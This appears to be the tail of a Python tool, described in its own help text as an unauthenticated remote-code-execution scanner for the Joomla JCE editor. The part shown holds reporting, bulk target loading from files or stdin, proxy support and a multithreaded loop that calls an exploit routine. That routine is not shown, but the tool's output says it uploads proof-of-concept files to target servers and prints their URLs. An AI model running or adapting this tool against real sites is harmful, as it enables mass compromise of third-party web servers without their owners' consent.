    print(f"{c}{'═'*76}{S.RST}")
    print()


def print_summary(results, elapsed):
    total = len(results)
    counts = {}
    for r in results:
        counts[r["status"]] = counts.get(r["status"], 0) + 1
    joomla_detected = sum(1 for r in results if r["joomla_found"])
    jce_detected = sum(1 for r in results if r["jce_found"])
    safe_notjoomla = counts.get("SAFE", 0) + counts.get("NOT_JOOMLA", 0)

    metrics = [
        ("Total Scanned", str(total), S.WHT),
        ("Joomla! Detected", str(joomla_detected), S.WHT),
        ("JCE Detected", str(jce_detected), S.WHT),
        ("VULNERABLE", str(counts.get('VULNERABLE', 0)), S.RED),
        ("VULNERABLE_UPLOAD_ONLY", str(counts.get('VULNERABLE_UPLOAD_ONLY', 0)), S.YEL),
        ("PATCHED", str(counts.get('PATCHED', 0)), S.GRN),
        ("SAFE / Not Joomla", str(safe_notjoomla), S.WHT),
        ("BLOCKED BY WAF", str(counts.get('BLOCKED_BY_WAF', 0)), S.YEL),
        ("ERROR", str(counts.get('ERROR', 0)), S.WHT),
        ("Time", f"{elapsed:.1f}s", S.WHT),
    ]

    if HAS_RICH:
        console = Console()
        console.print()
        table = Table(title="[bold cyan]SCAN SUMMARY", box=rich_box.ROUNDED, expand=False, width=46)
        table.add_column("Metric", style="cyan")
        table.add_column("Count", justify="right")
        for name, val, _ in metrics:
            style = None
            if name == "VULNERABLE": style = "red"
            elif name == "VULNERABLE_UPLOAD_ONLY": style = "yellow"
            elif name == "PATCHED": style = "green"
            elif name == "BLOCKED BY WAF": style = "yellow"
            table.add_row(name, val, style=style)
        console.print(table)
        console.print()
        return

    print()
    print(f"{S.CYN}{S.BLD}                    SCAN SUMMARY{S.RST}")
    print(f"{S.CYN}{S.BLD}╔══════════════════════════════════════╦═══════════╗{S.RST}")
    print(f"{S.CYN}{S.BLD}║{S.RST} Metric                               {S.CYN}{S.BLD}║{S.RST}     Count {S.CYN}{S.BLD}║{S.RST}")
    print(f"{S.CYN}{S.BLD}╠══════════════════════════════════════╬═══════════╣{S.RST}")
    for name, val, color in metrics:
        print(f"{S.CYN}{S.BLD}║{S.RST} {color}{name:<36}{S.RST} {S.CYN}{S.BLD}║{S.RST} {color}{val:>9}{S.RST} {S.CYN}{S.BLD}║{S.RST}")
    print(f"{S.CYN}{S.BLD}╚══════════════════════════════════════╩═══════════╝{S.RST}")
    print()


class ExcelReporter:
    def __init__(self, filepath):
        self.path = filepath
        self.lock = threading.Lock()
        self.row = 2
        if HAS_OPENPYXL:
            Path(filepath).parent.mkdir(parents=True, exist_ok=True)
            self.wb = Workbook()
            self.ws = self.wb.active
            self.ws.title = "Results"
            self._header()

    def _header(self):
        if not HAS_OPENPYXL:
            return
        hdr = ["No", "URL", "Joomla! Found", "Joomla! Version", "Joomla! Latest",
               "JCE Found", "JCE Version", "JCE Latest", "JCE Outdated",
               "Status", "Confidence", "WAF Detected", "WAF Name",
               "Uploaded Filename", "Proof URL", "Detail", "Action",
               "Scan Time (ms)", "Timestamp"]
        self.ws.append(hdr)
        for cell in self.ws[1]:
            cell.font = Font(bold=True, color="FFFFFF")
            cell.fill = PatternFill(start_color="1F4E78", end_color="1F4E78", fill_type="solid")
            cell.alignment = Alignment(horizontal="center", vertical="center")
        self.ws.freeze_panes = "A2"

    def _fill(self, status):
        if not HAS_OPENPYXL:
            return None
        colors = {
            "VULNERABLE": "FF0000", "VULNERABLE_UPLOAD_ONLY": "FF8C00",
            "PATCHED": "90EE90", "SAFE": "87CEEB",
            "BLOCKED_BY_WAF": "FFD700", "NOT_JOOMLA": "D3D3D3",
            "ERROR": "C0C0C0",
        }
        return PatternFill(start_color=colors.get(status, "FFFFFF"), end_color=colors.get(status, "FFFFFF"), fill_type="solid")

    def append(self, idx, res):
        if not HAS_OPENPYXL:
            return
        with self.lock:
            outdated = "Unknown"
            if res.get("jce_outdated") is True:
                outdated = "Yes"
            elif res.get("jce_outdated") is False:
                outdated = "No"

            row = [
                idx, res["target"],
                "Yes" if res["joomla_found"] else "No",
                res["joomla_version"] or "unknown", JOOMLA_LATEST,
                "Yes" if res["jce_found"] else "No",
                res["jce_version"] or "unknown", JCE_LATEST,
                outdated, res["status"], res["confidence"],
                "Yes" if res["waf_detected"] else "No",
                res["waf_name"] or "",
                res.get("uploaded_filename") or "",
                res["proof_url"] or "",
                res.get("detail", ""), res.get("action", ""),
                res.get("scan_time_ms", 0), res.get("timestamp", ""),
            ]
            self.ws.append(row)

            sc = self.ws.cell(row=self.row, column=10)
            f = self._fill(res["status"])
            if f:
                sc.fill = f
                if res["status"] in ("VULNERABLE", "VULNERABLE_UPLOAD_ONLY"):
                    sc.font = Font(bold=True, color="FFFFFF")
                elif res["status"] == "PATCHED":
                    sc.font = Font(bold=True, color="006100")
                elif res["status"] == "SAFE":
                    sc.font = Font(bold=True, color="004080")
                elif res["status"] == "BLOCKED_BY_WAF":
                    sc.font = Font(bold=True, color="806000")
                elif res["status"] in ("NOT_JOOMLA", "ERROR"):
                    sc.font = Font(color="505050")

            jv_cell = self.ws.cell(row=self.row, column=4)
            jl_cell = self.ws.cell(row=self.row, column=5)
            jl_cell.font = Font(color="006100", bold=True)
            jv = res.get("joomla_version")
            if jv and version_less_than(jv, JOOMLA_LATEST):
                jv_cell.font = Font(color="FF0000", bold=True)
            elif jv:
                jv_cell.font = Font(color="006100", bold=True)
            else:
                jv_cell.font = Font(color="808080")

            cv_cell = self.ws.cell(row=self.row, column=7)
            cl_cell = self.ws.cell(row=self.row, column=8)
            cl_cell.font = Font(color="006100", bold=True)
            jcv = res.get("jce_version")
            if jcv and version_less_than(jcv, JCE_LATEST):
                cv_cell.font = Font(color="FF0000", bold=True)
            elif jcv:
                cv_cell.font = Font(color="006100", bold=True)
            else:
                cv_cell.font = Font(color="808080")

            oc = self.ws.cell(row=self.row, column=9)
            if res.get("jce_outdated") is True:
                oc.font = Font(color="FF0000", bold=True)
            elif res.get("jce_outdated") is False:
                oc.font = Font(color="006100", bold=True)
            else:
                oc.font = Font(color="808080")

            self.row += 1

    def save(self):
        if not HAS_OPENPYXL:
            return
        for col in self.ws.columns:
            max_len = 0
            col_l = col[0].column_letter
            for cell in col:
                try:
                    if cell.value:
                        max_len = max(max_len, len(str(cell.value)))
                except Exception:
                    pass
            self.ws.column_dimensions[col_l].width = min(max_len + 2, 60)
        self.wb.save(self.path)


def load_targets(args):
    targets = []
    if args.url:
        targets.append(normalize_url(args.url))
    if args.list:
        try:
            with open(args.list, "r") as f:
                targets += [normalize_url(l) for l in f if l.strip()]
        except FileNotFoundError:
            print(f"{S.RED}[!] File not found: {args.list}{S.RST}")
            sys.exit(1)
    if not sys.stdin.isatty():
        for line in sys.stdin:
            line = line.strip()
            if line:
                targets.append(normalize_url(line))
    return list(dict.fromkeys(targets))


def main():
    ap = argparse.ArgumentParser(
        description=f"{__tool__} — Joomla! JCE < {JCE_PATCHED} Unauthenticated RCE Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"Author: {__author__}\nExample: python {__tool__}.py -u https://target.com/joomla"
    )
    ap.add_argument("-u", "--url", help="Single target URL")
    ap.add_argument("-l", "--list", help="File containing URLs (one per line)")
    ap.add_argument("-o", "--output", help="Excel output path")
    ap.add_argument("-t", "--threads", type=int, default=5, help="Workers (default: 5)")
    ap.add_argument("-p", "--proxy", help="Proxy, e.g. http://127.0.0.1:8080")
    ap.add_argument("--timeout", type=int, default=TIMEOUT, help="Timeout in seconds")
    ap.add_argument("--verify-ssl", action="store_true", help="Verify SSL")
    ap.add_argument("-v", "--verbose", action="store_true", help="Verbose")
    ap.add_argument("-d", "--debug", action="store_true", help="Debug mode")
    ap.add_argument("--no-color", action="store_true", help="Disable colors")
    args = ap.parse_args()

    if not HAS_OPENPYXL:
        print(f"{S.YEL}[!] openpyxl not installed. Excel report disabled.{S.RST}")
        print(f"    pip install openpyxl{S.RST}")
    if not HAS_RICH:
        print(f"{S.YEL}[!] rich not installed. Using ANSI fallback.{S.RST}")
        print(f"    pip install rich{S.RST}")

    if args.no_color:
        for a in [x for x in dir(S) if not x.startswith("_")]:
            setattr(S, a, "")

    targets = load_targets(args)
    if not targets:
        ap.print_help()
        sys.exit(1)

    ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    out_path = args.output or f"reports/{__tool__}-report-{ts}.xlsx"
    reporter = ExcelReporter(out_path)

    clear_screen()
    print_banner()
    print(f"\n{S.CYN}[+] Loaded {len(targets)} target(s) | Threads: {args.threads} | Timeout: {args.timeout}s{S.RST}")
    print(f"{S.CYN}[+] Excel report: {out_path}{S.RST}\n")

    t0 = time.time()
    results = []
    counter = [0]
    total_targets = len(targets)

    def run_one(target):
        try:
            r = run_exploit(target, proxy=args.proxy, timeout=args.timeout, debug=args.debug)
        except Exception as e:
            r = {
                "target": target, "status": "ERROR", "confidence": "LOW",
                "detail": str(e), "joomla_found": False, "jce_found": False,
                "waf_detected": False, "proof_url": None, "uploaded_filename": None,
                "scan_time_ms": 0, "timestamp": datetime.datetime.now().isoformat(),
                "joomla_version": None, "jce_version": None, "jce_outdated": None,
                "waf_name": None, "patched": False, "csrf_found": False,
                "action": "Check network connectivity and target URL.",
            }
        with LOCK:
            counter[0] += 1
            idx = counter[0]
            st = r["status"]
            color = {
                "VULNERABLE": S.RED, "VULNERABLE_UPLOAD_ONLY": S.YEL,
                "PATCHED": S.GRN, "SAFE": S.BLU,
                "BLOCKED_BY_WAF": S.YEL, "NOT_JOOMLA": S.GRY, "ERROR": S.GRY
            }.get(st, S.WHT)
            print(f"  [{idx:>3}/{total_targets}] {color}{st:<22}{S.RST} {r['target']}")
            if args.verbose:
                print_card(r)
        reporter.append(idx, r)
        return r

    print(f"\n{S.CYN}[+] Scanning {total_targets} target(s) with {args.threads} thread(s)...{S.RST}\n")

    if len(targets) == 1:
        results.append(run_one(targets[0]))
    else:
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futures = {ex.submit(run_one, t): t for t in targets}
            for f in as_completed(futures):
                try:
                    results.append(f.result())
                except Exception as e:
                    t = futures[f]
                    fake = {
                        "target": t, "status": "ERROR", "confidence": "LOW",
                        "detail": f"Thread crash: {e}", "joomla_found": False,
                        "jce_found": False, "waf_detected": False, "proof_url": None,
                        "uploaded_filename": None, "scan_time_ms": 0,
                        "timestamp": datetime.datetime.now().isoformat(),
                        "action": "Check network connectivity and target URL.",
                    }
                    with LOCK:
                        counter[0] += 1
                        idx = counter[0]
                        print(f"  [{idx:>3}/{total_targets}] {S.GRY}{'ERROR':<22}{S.RST} {t}")
                        if args.verbose:
                            print_card(fake)
                    results.append(fake)

    elapsed = time.time() - t0
    reporter.save()

    print_summary(results, elapsed)
    print(f"\n{S.GRN}[+] Excel saved: {out_path}{S.RST}\n")

    vulns = [r for r in results if r["status"] in ("VULNERABLE", "VULNERABLE_UPLOAD_ONLY") and r.get("uploaded_filename")]
    if vulns:
        print(f"{S.YEL}{S.BLD}[!] REMINDER: You MUST manually delete the following uploaded POC files:{S.RST}")
        for r in vulns:
            print(f"    {S.RED}- {r['uploaded_filename']} on {r['target']}{S.RST}")
            if r.get("proof_url"):
                print(f"      {S.RED}  ↳ {r['proof_url']}{S.RST}")
        print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{S.YEL}[!] Interrupted by user.{S.RST}")
        sys.exit(0)
